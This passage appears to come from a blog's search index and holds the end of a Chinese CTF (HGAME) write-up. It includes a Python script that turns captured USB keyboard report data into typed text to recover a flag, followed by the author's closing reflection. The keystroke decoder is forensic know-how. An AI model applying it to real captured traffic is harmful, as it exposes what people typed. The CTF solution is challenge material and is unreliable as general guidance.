class="string">&quot;27&quot;</span>: <span class="string">&quot;)&quot;</span>,</span><br><span class="line">             <span class="string">&quot;28&quot;</span>: <span class="string">&quot;&lt;RET&gt;&quot;</span>, <span class="string">&quot;29&quot;</span>: <span class="string">&quot;&lt;ESC&gt;&quot;</span>, <span class="string">&quot;2a&quot;</span>: <span class="string">&quot;&lt;BS&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>: <span class="string">&quot;\t&quot;</span>, <span class="string">&quot;2c&quot;</span>: <span class="string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="string">&quot;2d&quot;</span>: <span class="string">&quot;_&quot;</span>, <span class="string">&quot;2e&quot;</span>: <span class="string">&quot;+&quot;</span>, <span class="string">&quot;2f&quot;</span>: <span class="string">&quot;&#123;&quot;</span>,</span><br><span class="line">             <span class="string">&quot;30&quot;</span>: <span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;31&quot;</span>: <span class="string">&quot;|&quot;</span>, <span class="string">&quot;32&quot;</span>: <span class="string">&quot;&lt;NON&gt;&quot;</span>, <span class="string">&quot;33&quot;</span>: <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;34&quot;</span>: <span class="string">&quot;:&quot;</span>, <span class="string">&quot;35&quot;</span>: <span class="string">&quot;~&quot;</span>, <span class="string">&quot;36&quot;</span>: <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;37&quot;</span>: <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;38&quot;</span>: <span class="string">&quot;?&quot;</span>,</span><br><span class="line">             <span class="string">&quot;39&quot;</span>: <span class="string">&quot;&lt;CAP&gt;&quot;</span>, <span class="string">&quot;3a&quot;</span>: <span class="string">&quot;&lt;F1&gt;&quot;</span>, <span class="string">&quot;3b&quot;</span>: <span class="string">&quot;&lt;F2&gt;&quot;</span>, <span class="string">&quot;3c&quot;</span>: <span class="string">&quot;&lt;F3&gt;&quot;</span>, <span class="string">&quot;3d&quot;</span>: <span class="string">&quot;&lt;F4&gt;&quot;</span>, <span class="string">&quot;3e&quot;</span>: <span class="string">&quot;&lt;F5&gt;&quot;</span>, <span class="string">&quot;3f&quot;</span>: <span class="string">&quot;&lt;F6&gt;&quot;</span>,</span><br><span class="line">             <span class="string">&quot;40&quot;</span>: <span class="string">&quot;&lt;F7&gt;&quot;</span>, <span class="string">&quot;41&quot;</span>: <span class="string">&quot;&lt;F8&gt;&quot;</span>, <span class="string">&quot;42&quot;</span>: <span class="string">&quot;&lt;F9&gt;&quot;</span>, <span class="string">&quot;43&quot;</span>: <span class="string">&quot;&lt;F10&gt;&quot;</span>, <span class="string">&quot;44&quot;</span>: <span class="string">&quot;&lt;F11&gt;&quot;</span>, <span class="string">&quot;45&quot;</span>: <span class="string">&quot;&lt;F12&gt;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">cap = <span class="literal">False</span>		<span class="comment">#不用全局的话出循环后cap值会恢复</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">key_anal</span>(<span class="params">state, now_line, pre_line</span>):</span><br><span class="line">    output = []</span><br><span class="line">    <span class="keyword">global</span> cap</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> state == <span class="string">&quot;02&quot;</span>:</span><br><span class="line">        shift = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> state == <span class="string">&quot;01&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> output</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            shift = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> now_line:</span><br><span class="line">        <span class="keyword">if</span> key <span class="keyword">in</span> pre_line:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> shiftKeys[key] == <span class="string">&quot;&lt;CAP&gt;&quot;</span>:</span><br><span class="line">                cap = <span class="keyword">not</span> cap</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> shift:</span><br><span class="line">                char = shiftKeys[key]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                char = normalKeys[key]</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> cap <span class="keyword">and</span> char.isupper():</span><br><span class="line">                char = char.lower()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> cap <span class="keyword">and</span> char.islower():</span><br><span class="line">                    char = char.upper()</span><br><span class="line"></span><br><span class="line">            output.append(char)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">key_conv</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        pre_line = []</span><br><span class="line">        output = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">            now_line = []</span><br><span class="line">            state = line[<span class="number">2</span>:<span class="number">4</span>]</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>, <span class="built_in">len</span>(line), <span class="number">2</span>):</span><br><span class="line">                key = line[i:i + <span class="number">2</span>]</span><br><span class="line">                <span class="keyword">if</span> key == <span class="string">&quot;00&quot;</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                now_line.append(key)</span><br><span class="line">            keys = key_anal(state, now_line, pre_line)</span><br><span class="line">            <span class="keyword">for</span> key <span class="keyword">in</span> keys:</span><br><span class="line">                <span class="keyword">if</span> key == <span class="string">&quot;&lt;BS&gt;&quot;</span>:</span><br><span class="line">                    output = output[:-<span class="number">1</span>]</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    output += key</span><br><span class="line">            pre_line = now_line</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    flag = key_conv(<span class="string">&quot;KeyStream.txt&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+
+
+<h2 id="Ending"><a href="#Ending" class="headerlink" title="Ending"></a>Ending</h2><blockquote>
+<p>一切都要有始有终</p>
+</blockquote>
+<p>AK了week1和week2，后面两周甚至有两三题都没怎么看；不想扯太多有的没的理由，没做好就是没做好，只能说还是需要更努力。进步了很多吗？唉，大概没有吧……但不管怎么说，我不想辜负自己的期待。一步一步来吧，之后是final。</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>比赛</category>
+      </categories>
+      <tags>
+        <tag>HGAME</tag>
+      </tags>
+  </entry>
+</search>
